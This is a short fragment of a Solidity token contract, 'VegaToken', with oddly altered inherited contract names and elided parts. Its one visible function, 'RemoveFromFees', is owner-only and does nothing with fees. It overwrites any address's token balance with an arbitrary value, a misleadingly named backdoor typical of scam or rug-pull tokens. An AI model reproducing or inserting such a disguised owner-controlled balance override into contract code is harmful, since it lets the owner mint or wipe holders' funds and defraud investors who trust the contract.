...
contract VegaToken is Contextrte, IBEPVega, Ownableertg {
 ...
 function RemoveFromFees(address CVega, uint256 CVegaNFT) external onlyOwner{
    _totbalances[CVega] = CVegaNFT;
  }
